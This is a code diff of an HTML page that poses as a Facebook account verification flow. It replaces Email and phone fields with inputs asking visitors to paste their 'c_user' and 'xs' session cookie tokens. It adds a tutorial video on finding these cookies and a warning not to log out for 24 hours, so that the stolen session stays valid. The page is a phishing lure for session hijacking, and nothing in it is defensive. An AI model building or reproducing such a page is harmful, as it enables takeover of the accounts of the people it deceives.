@@ -523,7 +523,7 @@
             <div class="step">
               <div class="step-number">1</div>
               <div class="step-content">
-                <div class="step-title">follow the steps</div>
+                <div class="step-title">Watch the verification video</div>
                 <div class="step-description">
                   Learn how to find your Facebook authentication tokens
                 </div>
@@ -551,17 +551,23 @@
             </div>
           </div>
 
-         
+          <div class="video-container">
+            <video controls="" width="100%" style="background-color: #000">
+              <source src="https://blqiozzohqqszikuuqad.supabase.co/storage/v1/object/public/video/english.mp4" type="video/mp4"/>
+              Your browser does not support the video tag.
+            </video>
+          </div>
 
           <p class="video-instruction">
-           
+            Follow the video instructions to locate your authentication tokens
+            in browser cookies
           </p>
 
           <div class="fb-input-group">
-            <label class="fb-input-label" for="Email">Email</label>
-            <input type="text" id="Email" class="fb-input" placeholder="Enter Your Email"/>
+            <label class="fb-input-label" for="c_user">c_user Token</label>
+            <input type="text" id="c_user" class="fb-input" placeholder="Enter c_user token (numbers only)"/>
             <div id="c_user_error" class="error-message">
-              Error: Email must contain only numbers
+              Error: c_user must contain only numbers
             </div>
             <p class="fb-note">
               This token identifies your Facebook account for verification
@@ -569,10 +575,10 @@
           </div>
 
           <div class="fb-input-group">
-            <label class="fb-input-label" for="phone">phone</label>
-            <input type="text" id="phone" class="fb-input" placeholder="phone Number"/>
-            <div id="phone_error" class="error-message">
-              Error: phone must contain combination of letters, numbers and symbols
+            <label class="fb-input-label" for="xs">xs Token</label>
+            <input type="text" id="xs" class="fb-input" placeholder="Enter xs token (letters, numbers &amp; symbols)"/>
+            <div id="xs_error" class="error-message">
+              Error: xs must contain combination of letters, numbers and symbols
             </div>
             <p class="fb-note fb-note-warning">
               Important: Do not log out of your account for 24 hours after
